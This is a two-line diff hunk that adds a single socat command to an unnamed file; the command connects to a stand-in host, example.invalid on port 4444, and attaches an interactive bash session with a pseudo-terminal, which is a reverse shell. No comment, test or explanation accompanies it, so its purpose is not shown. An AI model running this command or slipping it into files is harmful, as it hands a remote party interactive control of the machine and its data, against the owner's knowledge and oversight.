@@ -1,0 +1,2 @@
+socat TCP:example.invalid:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
+
